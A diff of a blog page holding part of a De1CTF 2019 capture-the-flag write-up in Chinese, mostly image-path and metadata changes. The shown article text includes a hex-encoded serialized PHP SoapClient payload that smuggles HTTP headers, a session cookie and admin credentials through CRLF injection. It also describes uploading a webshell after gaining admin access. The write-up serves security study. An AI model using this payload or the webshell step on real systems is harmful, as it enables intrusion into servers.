@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="gml&#39;s blog">
 <meta property="og:description" content="WebSSRF Me题目直接给了源码：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564935289050.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;1564935289050.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564935320266.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564935675917.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564992637886.png">
@@ -26,9 +26,9 @@
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564993135656.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564938682820.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564938645133.png">
-<meta property="og:updated_time" content="2019-10-28T17:19:29.580Z">
+<meta property="og:updated_time" content="2019-10-29T07:42:29.420Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;2019-de1ctf%5C1564935289050.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;08&#x2F;04&#x2F;2019-de1ctf&#x2F;1564935289050.png">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -214,7 +214,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3230313a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d663176723566383138396c6d366f7171746f64716b76703772360d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d393135373230223b733a31333a225f736f61705f76657273696f6e223b693a313b7d</span><br></pre></td></tr></table></figure>
 
 <p>然后在签名处：</p>
-<p><img src="2019-de1ctf%5C1564935289050.png" alt="1564935289050"></p>
+<p><img src="1564935289050.png" alt="1564935289050"></p>
 <p><img src="2019-de1ctf%5C1564935320266.png" alt="1564935320266"></p>
 <p>刷新一下PHPSESSID是f1vr5f8189lm6oqqtodqkvp7r6的浏览器页面，就是admin了。</p>
 <p>进入admin，写个马，然后访问/upload/gml.php，就可以得到webshell，然后提示说flag在内网机器里。。。</p>
@@ -380,6 +380,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2019/10/29/weiphp5-0-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          weiphp5.0-漏洞复现
+        
+      </div>
+    </a>
+  
   
     <a href="/2019/05/27/2019%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20wp/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">2019 强网杯 wp</div>
@@ -463,6 +472,27 @@ gitalk.render('gitalk-container')
 </script>
 
   
+
+<!--简书外链-->
+<script>
+var link = "" ;
+// 遍历所有的img标签
+$("img").each( (i,o) => {
+	
+	var o = $(o);
+	alert(o.attr("src"));
+    // 判断图片的链接是否包含sinaimg关键字
+	if( o.attr("src").indexOf("jianshu") > 0 ){
+	
+        // 给这个标签加上referrerPlicy属性
+		o.attr("referrerpolicy","no-referrer");
+        // 备份图片的src
+		link = o.attr("src");
+        // 重新设置src，让页面重新加载一次图片
+		o.attr("src",link);
+	}
+});
+</script>
 
           </div>
         </div>
